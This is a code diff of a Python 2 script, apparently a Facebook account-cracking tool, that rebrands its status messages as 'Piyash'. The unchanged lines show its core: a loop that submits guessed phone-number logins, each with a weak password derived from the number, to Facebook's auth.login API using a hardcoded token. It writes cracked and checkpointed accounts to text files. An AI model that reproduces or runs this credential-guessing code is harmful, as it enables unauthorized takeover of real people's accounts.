@@ -153,7 +153,7 @@ def menu():
     psb('[-_-] Lets Start Hunting')
     time.sleep(0.5)
     print 50 * '\x1b[1;33;40m-'
-    psb('\x1b[1;32;40mHacked Accouny Will Appear Here')
+    psb('\x1b[1;32;40mHacked Accouny Will Appear Here Success id are Just now login & Cp id login after3 days')
     print
 
     def main(arg):
@@ -168,13 +168,13 @@ def menu():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + user + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[*_*Hacked*_*]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
+                print '\x1b[1;92m[*_*Piyash Successful*_*]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                 okb = open('piyash/successfull.txt', 'a')
                 okb.write(k + c + user + '|' + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '[Login After 7 Days] ' + k + c + user + ' | ' + pass1 + '\n'
+                print '[PIYASH(CP) Login After 3 Days] ' + k + c + user + ' | ' + pass1 + '\n'
                 cps = open('piyash/checkpoint.txt', 'a')
                 cps.write(k + c + user + '|' + pass1 + '\n')
                 cps.close()
